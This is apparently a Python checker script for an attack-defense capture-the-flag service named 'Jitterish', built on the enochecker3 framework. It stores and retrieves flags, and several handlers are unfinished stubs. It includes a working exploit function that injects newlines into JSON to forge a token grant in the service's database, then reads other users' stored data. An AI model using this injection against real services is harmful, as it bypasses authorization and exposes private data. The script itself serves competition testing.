import json
import os
from functools import wraps
from logging import LoggerAdapter
from typing import Callable, TypeVar, ParamSpec, Awaitable

from enochecker3 import (
    ChainDB,
    DependencyInjector,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    InternalErrorException,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher, assert_in, assert_equals
from httpx import AsyncClient

from client import JitterishClient
from utils import *
from codegen import CodeGenerator, Context

T = TypeVar("T")
P = ParamSpec("P")

print("HERE", os.environ, flush=True)
checker = Enochecker("Jitterish", 8000)
app = lambda: checker.app


def handle_invalid_response_exceptions(f: Callable[P, Awaitable[T]]) -> Callable[P, Awaitable[T]]:
    @wraps(f)
    async def wrapper(*args: P.args, **kwargs: P.kwargs) -> T:
        try:
            return await f(*args, **kwargs)
        except KeyError as e:
            raise MumbleException("Key not found") from e

    return wrapper


@checker.putflag(0)
@handle_invalid_response_exceptions
async def putflag_enterprise(task: PutflagCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
                             db: ChainDB) -> str:
    """
    "Enterprise" account with API access and a few tokens.
    """
    client = JitterishClient(logger, httpclient)

    username = generate_username()
    password = generate_password()
    await client.register(username, password,
                          generate_random_string(8, False), generate_random_string(8, False),
                          'enterprise')

    for _ in range(random.randint(0, 2)):
        await client.api_create(username, CodeGenerator({}).any_expr.generate(Context()).value)
    key = await client.api_create(username, {'flag': task.flag, 'ident': task.task_id})
    logger.info(f'key = {key}')
    for _ in range(random.randint(0, 1)):
        await client.api_create(username, CodeGenerator({}).any_expr.generate(Context()).value)
    token = generate_token()
    logger.info(f'token = {key}')
    grant_result = await client.api_grant(username, key, token)
    if not grant_result:
        raise MumbleException('Could not grant token auth')
    for _ in range(random.randint(0, 2)):
        await client.api_grant(username, key, generate_token())

    await db.set("info", (username, password, key, token))
    return username


@checker.getflag(0)
@handle_invalid_response_exceptions
async def getflag_enterprise(task: GetflagCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
                             db: ChainDB) -> None:
    try:
        username, password, key, token = await db.get("info")
    except KeyError:
        raise MumbleException("Database info missing")

    # key is public?
    client = JitterishClient(logger, httpclient)
    keys = await client.api_get(username, 'keys')
    assert_in(key, keys, "Key missing")

    # token auth
    payload = await client.api_get(username, 'value', key, token)
    assert_equals(payload['flag'], task.flag, "Flag missing")

    # user auth
    await client.login(username, password)
    payload = await client.api_get(username, 'value', key)
    assert_equals(payload['flag'], task.flag, "Flag missing")


@checker.putflag(1)
@handle_invalid_response_exceptions
async def putflag_community(task: PutflagCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
                            db: ChainDB) -> str:
    """
    "Community" account with 2 relations. Flag is in the private one.
    Use with JIT exploits.
    """
    return "TODO"


@checker.getflag(1)
@handle_invalid_response_exceptions
async def getflag_community(task: GetflagCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
                            db: ChainDB) -> None:
    ...


@checker.putnoise(0)
async def putnoise(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> None:
    # await db.set("info", (username, wish, keyvals))
    ...


@checker.getnoise(0)
async def getnoise(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB,
                   di: DependencyInjector) -> None:
    try:
        username, wish, keyvals = await db.get("info")
    except KeyError:
        raise MumbleException("Database info missing")
    ...


@checker.havoc(0)
async def havoc(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB,
                di: DependencyInjector) -> None:
    ...


@checker.exploit(0)
async def exploit_kv_newline_injection(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher,
                                       httpclient: AsyncClient) -> str | None:
    if task.attack_info == "":
        raise InternalErrorException("Missing attack info")
    username = task.attack_info
    client = JitterishClient(logger, httpclient)
    my_token = generate_token()

    # get keys
    keys = (await client.api_get(username))[:3]
    # hack first 3 keys
    data = ''
    for key in keys:
        # these newlines inject a faked "grant" structure into the database
        data = '{"fake_token":\n' + json.dumps({'key': key, 'token': my_token}) + '\n}'
        await client.post(f'/api/{username}/create', data=data, headers={'Content-Type': 'application/json'})
        response = await client.api_get(username, 'value', key, my_token)
        logger.info(f'Key {key} => {response}')
        data += json.dumps(response)
    return searcher.search_flag(data)


if __name__ == "__main__":
    # production: gunicorn -c gunicorn.conf.py "checker:app()"
    checker.run(port=8001)
